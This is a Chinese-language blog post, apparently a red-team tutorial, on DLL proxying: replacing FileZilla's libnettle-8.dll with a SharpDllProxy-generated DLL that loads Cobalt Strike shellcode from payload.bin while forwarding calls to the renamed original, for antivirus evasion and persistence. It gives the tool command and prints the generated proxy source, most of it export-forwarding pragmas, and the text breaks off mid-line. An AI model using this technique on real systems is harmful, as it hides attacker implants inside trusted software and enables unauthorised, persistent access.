    <url>/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>在程序开发过程中往往会使用第三方库，大多数第三方库会提供DLL(动态链接库)文件，因此程序需要相应的DLL文件才能启动，通过Dll代理将正常dll替换为欸一dll，可以进行免杀或权限维持</p><h2 id="找出运行必须的dll文件"><a href="#找出运行必须的dll文件" class="headerlink" title="找出运行必须的dll文件"></a>找出运行必须的dll文件</h2><p>依照<a href="https://cloud.tencent.com/developer/article/1739263">DLL代理加载shellcod用于免杀，维权等等</a>中的例子下载Filezilla，将fzsftp.exe放到单独文件夹运行，找到运行必须的libnettle-8.dll文件</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c7d34521-824d-4e6a-a5b8-0f0f4d0ae451.png" alt="imgbed.cn图床"></a></p><h2 id="编译SharpDllProxy"><a href="#编译SharpDllProxy" class="headerlink" title="编译SharpDllProxy"></a>编译SharpDllProxy</h2><p>下载<a href="https://github.com/Flangvik/SharpDllProxy">SharpDllProxy</a>后用Visual Stuio 2019打开SharpDllProxy.sln</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c4a78070-bf3b-47e9-b1a4-b0341271a84a.png" alt="imgbed.cn图床"></a></p><p>编译生成SharpDllProxy.exe</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/92bcf89d-6ba8-475c-8a6e-e31a3d6dfa70.png" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f2af1a5d-1719-4994-ae6a-73edf135ca97.png" alt="imgbed.cn图床"></a></p><h2 id="生成代理Dll"><a href="#生成代理Dll" class="headerlink" title="生成代理Dll"></a>生成代理Dll</h2><p>指定目标dll文件后生成libnettle-8_pragma.c和tmp2BF5.dll，payload.bin为cs生成的raw格式shellcode。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharpdllproxy.exe --dll E:\dllproxy\libnettle-8.dll --payload E:\dllproxy\payload.bin</span><br></pre></td></tr></table></figure><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d224dd7c-0e3f-4e6c-81c2-cca3e5fd95df.png" alt="imgbed.cn图床"></a></p><p>在vs中新建动态链接库将生成的libnettle-8_pragma.c代码复制后编译生成可执行shellcode的同名dll文件用以顶替原有的libnettle-8.dll文件</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/96a19b88-da49-4db1-8bb2-76220cee925b.png" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f9649196-5f3d-4208-bf0b-12b3238a90b3.png" alt="imgbed.cn图床"></a></p><p>成功执行shellcode需要4个文件,fzsftp.exe调用替换后的恶意libnettle-8.dll文件后从payload.bin中读取shellcode后执行，tmp2BF5.dll即原来正常的libnettle-8.dll文件，保证程序正常运行</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/a2ea32b4-e77d-4b6b-aaca-b2110c185cb7.png" alt="imgbed.cn图床"></a>执行后cs成功上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/83b16014-31cb-4acd-b432-91311808019c.png" alt="imgbed.cn图床"></a></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>用vs打开libnettle-8_pragma.c后查看代码，开头调用了400多个tmp2BF5.dll中的函数以保证文件的正常运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define _CRT_SECURE_NO_DEPRECATE</span><br><span class="line">#pragma warning (disable : 4996)</span><br><span class="line"></span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aeads&#x3D;tmp2BF5._nettle_aeads,@1&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_decrypt&#x3D;tmp2BF5._nettle_aes_decrypt,@2&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_decrypt_aesni&#x3D;tmp2BF5._nettle_aes_decrypt_aesni,@3&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_decrypt_x86_64&#x3D;tmp2BF5._nettle_aes_decrypt_x86_64,@4&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_encrypt&#x3D;tmp2BF5._nettle_aes_encrypt,@5&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_encrypt_aesni&#x3D;tmp2BF5._nettle_aes_encrypt_aesni,@6&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_encrypt_table&#x3D;tmp2BF5._nettle_aes_encrypt_table,@7&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_encrypt_x86_64&#x3D;tmp2BF5._nettle_aes_encrypt_x86_64,@8&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_invert&#x3D;tmp2BF5._nettle_aes_invert,@9&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_set_key&#x3D;tmp2BF5._nettle_aes_set_key,@10&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_armors&#x3D;tmp2BF5._nettle_armors,@11&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_camellia_absorb&#x3D;tmp2BF5._nettle_camellia_absorb,@12&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_camellia_crypt&#x3D;tmp2BF5._nettle_camellia_crypt,@13&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_camellia_invert_key&#x3D;tmp2BF5._nettle_camellia_invert_key,@14&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_camellia_table&#x3D;tmp2BF5._nettle_camellia_table,@15&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_chacha_core&#x3D;tmp2BF5._nettle_chacha_core,@16&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_ciphers&#x3D;tmp2BF5._nettle_ciphers,@17&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_cpuid&#x3D;tmp2BF5._nettle_cpuid,@18&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_ctr_crypt16&#x3D;tmp2BF5._nettle_ctr_crypt16,@19&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_gcm_hash8&#x3D;tmp2BF5._nettle_gcm_hash8,@20&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_gost28147_encrypt_block&#x3D;tmp2BF5._nettle_gost28147_encrypt_block,@21&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_gost28147_param_CryptoPro_3411&#x3D;tmp2BF5._nettle_gost28147_param_CryptoPro_3411,@22&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_gost28147_param_test_3411&#x3D;tmp2BF5._nettle_gost28147_param_test_3411,@23&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_hashes&#x3D;tmp2BF5._nettle_hashes,@24&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_macs&#x3D;tmp2BF5._nettle_macs,@25&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_memxor_sse2&#x3D;tmp2BF5._nettle_memxor_sse2,@26&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_memxor_x86_64&#x3D;tmp2BF5._nettle_memxor_x86_64,@27&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_poly1305_block&#x3D;tmp2BF5._nettle_poly1305_block,@28&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_poly1305_digest&#x3D;tmp2BF5._nettle_poly1305_digest,@29&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_poly1305_set_key&#x3D;tmp2BF5._nettle_poly1305_set_key,@30&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_ripemd160_compress&#x3D;tmp2BF5._nettle_ripemd160_compress,@31&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_salsa20_core&#x3D;tmp2BF5._nettle_salsa20_core,@32&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha1_compress_sha_ni&#x3D;tmp2BF5._nettle_sha1_compress_sha_ni,@33&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha1_compress_x86_64&#x3D;tmp2BF5._nettle_sha1_compress_x86_64,@34&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha256_compress&#x3D;tmp2BF5._nettle_sha256_compress,@35&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha256_compress_sha_ni&#x3D;tmp2BF5._nettle_sha256_compress_sha_ni,@36&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha256_compress_x86_64&#x3D;tmp2BF5._nettle_sha256_compress_x86_64,@37&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha3_pad&#x3D;tmp2BF5._nettle_sha3_pad,@38&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha3_update&#x3D;tmp2BF5._nettle_sha3_update,@39&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha512_compress&#x3D;tmp2BF5._nettle_sha512_compress,@40&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l2&#x3D;tmp2BF5._nettle_umac_l2,@41&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l2_final&#x3D;tmp2BF5._nettle_umac_l2_final,@42&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l2_init&#x3D;tmp2BF5._nettle_umac_l2_init,@43&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l3&#x3D;tmp2BF5._nettle_umac_l3,@44&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l3_init&#x3D;tmp2BF5._nettle_umac_l3_init,@45&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_nh&#x3D;tmp2BF5._nettle_umac_nh,@46&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_nh_n&#x3D;tmp2BF5._nettle_umac_nh_n,@47&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_poly128&#x3D;tmp2BF5._nettle_umac_poly128,@48&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_poly64&#x3D;tmp2BF5._nettle_umac_poly64,@49&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_set_key&#x3D;tmp2BF5._nettle_umac_set_key,@50&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_write_be32&#x3D;tmp2BF5._nettle_write_be32,@51&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_write_le32&#x3D;tmp2BF5._nettle_write_le32,@52&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_write_le64&#x3D;tmp2BF5._nettle_write_le64,@53&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_MD5Final&#x3D;tmp2BF5.nettle_MD5Final,@54&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_MD5Init&#x3D;tmp2BF5.nettle_MD5Init,@55&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_MD5Update&#x3D;tmp2BF5.nettle_MD5Update,@56&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128&#x3D;tmp2BF5.nettle_aes128,@57&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_decrypt&#x3D;tmp2BF5.nettle_aes128_decrypt,@58&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_encrypt&#x3D;tmp2BF5.nettle_aes128_encrypt,@59&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_invert_key&#x3D;tmp2BF5.nettle_aes128_invert_key,@60&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_set_decrypt_key&#x3D;tmp2BF5.nettle_aes128_set_decrypt_key,@61&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_set_encrypt_key&#x3D;tmp2BF5.nettle_aes128_set_encrypt_key,@62&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192&#x3D;tmp2BF5.nettle_aes192,@63&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_decrypt&#x3D;tmp2BF5.nettle_aes192_decrypt,@64&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_encrypt&#x3D;tmp2BF5.nettle_aes192_encrypt,@65&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_invert_key&#x3D;tmp2BF5.nettle_aes192_invert_key,@66&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_set_decrypt_key&#x3D;tmp2BF5.nettle_aes192_set_decrypt_key,@67&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_set_encrypt_key&#x3D;tmp2BF5.nettle_aes192_set_encrypt_key,@68&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256&#x3D;tmp2BF5.nettle_aes256,@69&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_decrypt&#x3D;tmp2BF5.nettle_aes256_decrypt,@70&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_encrypt&#x3D;tmp2BF5.nettle_aes256_encrypt,@71&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_invert_key&#x3D;tmp2BF5.nettle_aes256_invert_key,@72&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_set_decrypt_key&#x3D;tmp2BF5.nettle_aes256_set_decrypt_key,@73&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_set_encrypt_key&#x3D;tmp2BF5.nettle_aes256_set_encrypt_key,@74&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_decrypt&#x3D;tmp2BF5.nettle_aes_decrypt,@75&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_encrypt&#x3D;tmp2BF5.nettle_aes_encrypt,@76&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_invert_key&#x3D;tmp2BF5.nettle_aes_invert_key,@77&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_set_decrypt_key&#x3D;tmp2BF5.nettle_aes_set_decrypt_key,@78&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_set_encrypt_key&#x3D;tmp2BF5.nettle_aes_set_encrypt_key,@79&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arcfour128_set_key&#x3D;tmp2BF5.nettle_arcfour128_set_key,@80&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arcfour_crypt&#x3D;tmp2BF5.nettle_arcfour_crypt,@81&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arcfour_set_key&#x3D;tmp2BF5.nettle_arcfour_set_key,@82&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo128&#x3D;tmp2BF5.nettle_arctwo128,@83&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo128_set_key&#x3D;tmp2BF5.nettle_arctwo128_set_key,@84&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo128_set_key_gutmann&#x3D;tmp2BF5.nettle_arctwo128_set_key_gutmann,@85&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo40&#x3D;tmp2BF5.nettle_arctwo40,@86&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo40_set_key&#x3D;tmp2BF5.nettle_arctwo40_set_key,@87&quot;)</span><br><span class="line">#pragma comment(linker, 